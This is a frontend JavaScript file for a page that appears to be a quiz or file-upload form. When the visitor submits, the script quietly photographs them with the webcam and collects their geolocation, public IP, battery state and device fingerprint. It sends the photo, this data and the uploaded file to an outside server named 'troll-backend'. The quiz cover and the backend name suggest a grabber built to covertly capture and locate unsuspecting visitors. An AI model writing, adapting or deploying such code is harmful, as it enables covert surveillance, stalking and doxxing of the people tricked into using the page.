// ================================
// FRONTEND SCRIPT.JS
// ================================

const btn = document.getElementById('submit-btn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const fileInput = document.getElementById('user-file');
const toast = document.getElementById('toast');

const BACKEND_BASE = "https://troll-backend.onrender.com/api";

// Camera constraints
const constraints = { video: { facingMode: "user" }, audio: false };

// ================================
// SHOW TOAST
// ================================
function showToast(message = "Done") {
  if (!toast) return;
  toast.textContent = message;
  toast.style.display = "block";
  setTimeout(() => { toast.style.display = "none"; }, 3000);
}

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  const meta = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory || "N/A",
    ip: "N/A",
    time: new Date().toLocaleString()
  };

  // Battery
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      meta.battery = `${b.level * 100}% charging:${b.charging}`;
    } catch {}
  }

  // Location
  if (navigator.geolocation) {
    try {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej)
      );
      meta.location = `${pos.coords.latitude},${pos.coords.longitude}`;
    } catch {}
  }

  // Get IP from a public API
  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    meta.ip = ipData.ip;
  } catch {}

  return meta;
}

// ================================
// CAPTURE CAMERA IMAGE
// ================================
async function capturePhoto() {
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL("image/png");
}

// ================================
// SEND CAMERA IMAGE + METADATA
// ================================
async function sendCameraData() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    // Wait 2–3s for user to focus
    await new Promise(r => setTimeout(r, 2500));

    const image = await capturePhoto();
    const metadata = await collectMetadata();

    const res = await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata })
    });

    const data = await res.json();
    if (data.success) showToast("Camera captured & sent!");
    else showToast("Camera upload failed");

    stream.getTracks().forEach(t => t.stop());
  } catch (err) {
    console.error("Camera error:", err);
    alert("Camera permission denied or error occurred.");
  }
}

// ================================
// SEND FILE UPLOAD
// ================================
async function sendFileUpload(file) {
  if (!file) return;

  const reader = new FileReader();
  reader.onload = async () => {
    const base64 = reader.result;

    const res = await fetch(`${BACKEND_BASE}/file-upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      // ⚡ IMPORTANT: send { file, filename } to match schema
      body: JSON.stringify({ file: base64, filename: file.name })
    });

    const data = await res.json();
    if (data.success) showToast("File uploaded successfully!");
    else showToast("File upload failed");
  };

  reader.readAsDataURL(file);
}

// ================================
// HANDLE FORM SUBMIT
// ================================
btn.addEventListener("click", async e => {
  e.preventDefault();

  if (!fileInput.files.length) {
    alert("Please select a file before submitting.");
    return;
  }

  // 1️⃣ Capture camera
  await sendCameraData();

  // 2️⃣ Upload selected file
  await sendFileUpload(fileInput.files[0]);

  // 3️⃣ Show success page
  const quiz = document.getElementById("quiz-container");
  const success = document.getElementById("success-container");
  if (quiz && success) {
    quiz.style.display = "none";
    success.style.display = "flex";
  }
});
